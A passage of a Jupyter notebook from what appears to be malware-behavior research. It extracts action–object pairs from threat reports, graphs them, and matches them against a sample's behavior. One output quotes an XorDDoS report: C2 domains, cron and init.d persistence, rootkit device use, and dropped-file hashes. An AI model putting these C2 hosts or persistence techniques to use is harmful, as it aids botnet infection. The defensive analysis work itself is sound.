    "        #     \"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+\": \"ip_addr+port\",\n",
    "        #     \"0x[0-9a-zA-Z]{8}\": \"mem_addr\",\n",
    "        #     \"permission:{0,1}[0-9]{0,4}\": \"permission_id\"\n",
    "        # }\n",
    "        pass\n",
    "    def addItem(self, item:str) -> str:\n",
    "        # item = self.prettifyName(item) # 先不在這做~\n",
    "        if item in self.mapper.keys():\n",
    "            return self.mapper.get(item)\n",
    "        self.mapper[item] = str(self.index_counter)\n",
    "        self.index_counter += 1\n",
    "        return str(self.index_counter - 1)\n",
    "    def getSymbol(self, item:str):\n",
    "        return self.mapper.get(item, None)\n",
    "    # def prettifyName(self, item:str) -> str:\n",
    "    #     changed = self.pretty_name.get(item, None)\n",
    "    #     if changed:\n",
    "    #         return changed\n",
    "    #     return item\n",
    "\n",
    "def draw_asg_op_graph(asg_OPset: list[OperationPair], family=None):\n",
    "    dot = graphviz.Digraph(f'{family}_asg_OPset', comment='The Operational Pair Graph') \n",
    "    dot.node('Start', label=\"Malware (Subject)\")\n",
    "    mapper = ItemMapper()\n",
    "    for op in asg_OPset:\n",
    "        node_id = mapper.addItem(op.object)\n",
    "        dot.node(node_id, label=prettifyName(op.object)) # rename partial regex\n",
    "        if op.action:\n",
    "            dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "\n",
    "    # dot.graph_attr.update(ratio=\"0.4\")\n",
    "    u = dot.unflatten(stagger=3, fanout=True)\n",
    "    display(u)\n",
    "    del mapper\n",
    "    return u\n",
    "\n",
    "def draw_ctd_op_graph(fset:FamilySet):\n",
    "    for rem in fset.rem_lst:\n",
    "        # doc_OPset\n",
    "        if rem.doc_OPset is None or len(rem.doc_OPset) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in rem.doc_OPset:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"{rem.reportname} raw doc OPset\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "\n",
    "        # match_doc_OPset\n",
    "        if rem.match_doc_OPset is None or len(rem.match_doc_OPset) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in rem.match_doc_OPset:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"{rem.reportname} matched doc OPset\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "\n",
    "        # match_ASG_OPset\n",
    "        if rem.OPset_order_index is None or len(rem.OPset_order_index) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in [fset.sample.OPset_ordered[i] for i in rem.OPset_order_index]:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"matched ASG OPset for doc {rem.reportname}\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "    return\n",
    "\n",
    "draw_asg_op_graph(sample.OPset, family=family)\n",
    "draw_ctd_op_graph(fset)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: print matched sentence for specific document"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Report: Xorddos-Ms.csv. Matched OP count: 11\n",
      "--\n",
      "OP #38 fetch [a-zA-z]:\\d{1,5}$ www.enoan2107.com:3306\n",
      "after decoding the urls, it adds them into a remote list, which is later used to communicate and fetch commands from the command and control (c2) server:\n",
      "www.enoan2107.com:3306\n",
      "www.gzcfr5axf6.com:3306\n",
      "malicious activity threads\n",
      "after creating persistent entries, deleting evidence of its activities, and decoding config.rar, the malware initializes a cyclic redundancy check (crc) table followed by an unnamed semaphore using the sem_init api.\n",
      "--\n",
      "OP #50 drop /run/ /run/gcc.pid\n",
      "\n",
      "dropped files\n",
      "dropped file path\tfile type\tsha-256\n",
      "/etc/init.d/hflggwyfsc.elf\tshell script\t6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf\n",
      "/etc/cron.hourly/gcc.sh\tshell script\tcbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459\n",
      "/lib/libudev.so\telf\tf2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432\n",
      "/run/gcc.pid\ttext\t932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a\n",
      "/usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394\n",
      "/usr/bin/dmpyuitfoq\telf\t798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c\n",
      "/usr/bin/fdinprytpq\telf\t2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3\n",
      "/usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39\n",
      "/usr/bin/kagbjahdic\telf\te6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b\n",
      "/usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e\n",
      "/usr/bin/kndmhuqmah\telf\tb5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a\n",
      "/usr/bin/qkxqoelrfa\telf\td71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7\n",
      "/usr/bin/sykhrxsazz\telf\t9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489\n",
      "/usr/bin/tcnszvmpqn\telf\t360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd\n",
      "/usr/bin/zalkpggsgh\telf\tdc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7\n",
      "/usr/bin/zvcarxfquk\telf\t175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4\n",
      "/tmp/bin/3200\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea\n",
      "installer script\tbash script\t8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2\n",
      "/usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394\n",
      "/usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39\n",
      "/usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e\n",
      "/usr/bin/zvcarxfqul\telf (rootkit)\t483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25\n",
      "/usr/bin/zvzvmpqnv\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea\n",
      "\n",
      "--\n",
      "OP #27 install ^chkconfig$ chkconfig\n",
      "screenshot displaying chkconfig and update-rc.d commands installing the startup service\n",
      "figure 16. chkconfig and update-rc.d commands install the startup service\n",
      "argument-based code-flow\n",
      "xorddos has specific code paths corresponding to the number of arguments provided to the program.\n",
      "--\n",
      "OP #35 use /proc/ /proc/rs_dev\n",
      "\n",
      "xorddos uses /proc/rs_dev character device to communicate with the rootkit.\n",
      "--\n",
      "OP #30 create /var/run/ /var/run/.\n",
      "if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.\n",
      "--\n",
      "OP #40 fetch /var/run/ /var/run/gcc.pid\n",
      "\n",
      " kill_process\n",
      "\n",
      "the kill_process thread performs the following tasks:\n",
      "\n",
      "decodes encrypted strings\n",
      "fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file\n",
      "fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so\n",
      "fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process\n",
      "reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as:\n",
      "md5=\n",
      "filename=\n",
      "rmfile=\n",
      "denyip=\n",
      "tcp_thread\n",
      "\n",
      "the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().\n",
      "--\n",
      "OP #29 create /var/ /var/run/.\n",
      "if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.\n",
      "--\n",
      "OP #39 fetch /var/ /var/run/gcc.pid\n",
      "\n",
      " kill_process\n",
      "\n",
      "the kill_process thread performs the following tasks:\n",
      "\n",
      "decodes encrypted strings\n",
      "fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file\n",
      "fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so\n",
      "fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process\n",
      "reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as:\n",
      "md5=\n",
      "filename=\n",
      "rmfile=\n",
      "denyip=\n",
      "tcp_thread\n",
      "\n",
      "the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().\n",
      "--\n",
      "OP #41 fetch /run/ /var/run/gcc.pid\n",
      "\n",
      " kill_process\n",
      "\n",
      "the kill_process thread performs the following tasks:\n",
      "\n",
      "decodes encrypted strings\n",
      "fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file\n",
      "fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so\n",
      "fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process\n",
      "reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as:\n",
      "md5=\n",
      "filename=\n",
      "rmfile=\n",
      "denyip=\n",
      "tcp_thread\n",
      "\n",
      "the tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr().\n",
      "--\n",
      "OP #20 drop /etc/init.d/ /etc/init.d/hflggwyfsc.elf\n",
      "figure 11. content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf\n",
      "\n",
      "--\n",
      "OP #49 drop /etc/cron /etc/cron.hourly/gcc.sh\n",
      "\n",
      "dropped files\n",
      "dropped file path\tfile type\tsha-256\n",
      "/etc/init.d/hflggwyfsc.elf\tshell script\t6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf\n",
      "/etc/cron.hourly/gcc.sh\tshell script\tcbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459\n",
      "/lib/libudev.so\telf\tf2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432\n",
      "/run/gcc.pid\ttext\t932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a\n",
      "/usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394\n",
      "/usr/bin/dmpyuitfoq\telf\t798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c\n",
      "/usr/bin/fdinprytpq\telf\t2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3\n",
      "/usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39\n",
      "/usr/bin/kagbjahdic\telf\te6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b\n",
      "/usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e\n",
      "/usr/bin/kndmhuqmah\telf\tb5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a\n",
      "/usr/bin/qkxqoelrfa\telf\td71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7\n",
      "/usr/bin/sykhrxsazz\telf\t9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489\n",
      "/usr/bin/tcnszvmpqn\telf\t360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd\n",
      "/usr/bin/zalkpggsgh\telf\tdc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7\n",
      "/usr/bin/zvcarxfquk\telf\t175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4\n",
      "/tmp/bin/3200\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea\n",
      "installer script\tbash script\t8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2\n",
      "/usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394\n",
      "/usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39\n",
      "/usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e\n",
      "/usr/bin/zvcarxfqul\telf (rootkit)\t483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25\n",
      "/usr/bin/zvzvmpqnv\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# 印出 matched 句子\n",
    "report_id = 3\n",
    "reportname = fset.rem_lst[report_id].reportname\n",
    "print(f\"Report: {reportname}. Matched OP count: {len(fset.rem_lst[report_id].match_doc_OPset)}\")\n",
    "for i, op in enumerate(fset.rem_lst[report_id].match_doc_OPset):\n",
    "    print(f\"--\\nOP #{op.step_number} {op.action} {op.object} {op.original_object}\")\n",
    "    print(f\"{op.original_sentence}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "set()\n",
      "{<OP act=have, obj=0x[0-9a-zA-Z]{8}>, <OP act=None, obj=0x[0-9a-zA-Z]{8}>, <OP act=eserve, obj=0x[0-9a-zA-Z]{8}>, <OP act=r1,r2,r10,r11,lr, obj=0x[0-9a-zA-Z]{8}>, <OP act=None, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}>, <OP act=add, obj=0x[0-9a-zA-Z]{8}>, <OP act=None, obj=^sed$>, <OP act=look, obj=0x[0-9a-zA-Z]{8}>, <OP act=be, obj=0x[0-9a-zA-Z]{8}>, <OP act=go, obj=0x[0-9a-zA-Z]{8}>, <OP act=be, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}>, <OP act=svc, obj=0x[0-9a-zA-Z]{8}>, <OP act=pack, obj=0x[0-9a-zA-Z]{8}>, <OP act=find, obj=0x[0-9a-zA-Z]{8}>}\n",
      "{<OP act=connect, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}>, <OP act=modify, obj=/etc/rc>, <OP act=connect, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+>, <OP act=None, obj=/etc/rc>}\n",
      "{<OP act=add, obj=/etc/init.d/>, <OP act=add, obj=/etc/rc>, <OP act=format, obj=/etc/rc>, <OP act=None, obj=\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}>, <OP act=None, obj=/proc/>, <OP act=open, obj=/proc/>, <OP act=format, obj=^sed$>, <OP act=read, obj=/proc/>, <OP act=execute, obj=/etc/rc>, <OP act=give, obj=0x[0-9a-zA-Z]{8}>, <OP act=None, obj=uname(.)($)>}\n",
      "{<OP act=open, obj=nsswitch.conf>, <OP act=se, obj=^sed$>, <OP act=start, obj=/etc/init.d/>, <OP act=None, obj=/sys/>, <OP act=None, obj=/proc/>, <OP act=gather, obj=/proc/>, <OP act=None, obj=UID>, <OP act=se, obj=/etc/rc>, <OP act=open, obj=resolv.conf>}\n"
     ]
    }
   ],
   "source": [
    "# 測試區\n",
    "for rem in fset.rem_lst:\n",
    "    print(rem.doc_OPset)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>bin/sed</th>\n",
       "      <th>/etc/rc</th>\n",
       "      <th>/etc/init.d/</th>\n",
       "      <th>/proc/</th>\n",
       "      <th>/etc/sed</th>\n",
       "      <th>/selinux</th>\n",
       "      <th>/sys/</th>\n",
       "      <th>bin/</th>\n",
       "      <th>lsb-release</th>\n",
       "      <th>uname(.)($)</th>\n",
       "      <th>...</th>\n",
       "      <th>^sh$</th>\n",
       "      <th>^sed$</th>\n",
       "      <th>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+</th>\n",
       "      <th>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}</th>\n",
       "      <th>eth[0-9]$</th>\n",
       "      <th>0x[0-9a-zA-Z]{8}</th>\n",
       "      <th>permission:{0,1}[0-9]{0,4}</th>\n",
       "      <th>UID</th>\n",
       "      <th>GID</th>\n",
       "      <th>match</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>15 rows × 24 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "    bin/sed  /etc/rc  /etc/init.d/  /proc/  /etc/sed  /selinux  /sys/  bin/  \\\n",
       "0         0        0             0       0         0         0      0     0   \n",
       "1         0        0             0       0         0         0      0     0   \n",
       "2         0        0             0       0         0         0      0     0   \n",
       "3         0        0             0       0         0         0      0     0   \n",
       "4         0        0             0       0         0         0      0     0   \n",
       "5         0        0             0       0         0         0      0     0   \n",
       "6         0        0             0       0         0         0      0     0   \n",
       "7         0        0             0       0         0         0      0     0   \n",
       "8         0        0             0       0         0         0      0     0   \n",
       "9         0        0             0       0         0         0      0     0   \n",
       "10        0        0             0       0         0         0      0     0   \n",
       "11        0        0             0       0         0         0      0     0   \n",
       "12        0        0             0       0         0         0      0     0   \n",
       "13        0        0             0       0         0         0      0     0   \n",
       "14        0        0             0       0         0         0      0     0   \n",
       "\n",
       "    lsb-release  uname(.)($)  ...  ^sh$  ^sed$  \\\n",
       "0             0            0  ...     0      0   \n",
       "1             0            0  ...     0      0   \n",
       "2             0            0  ...     0      0   \n",
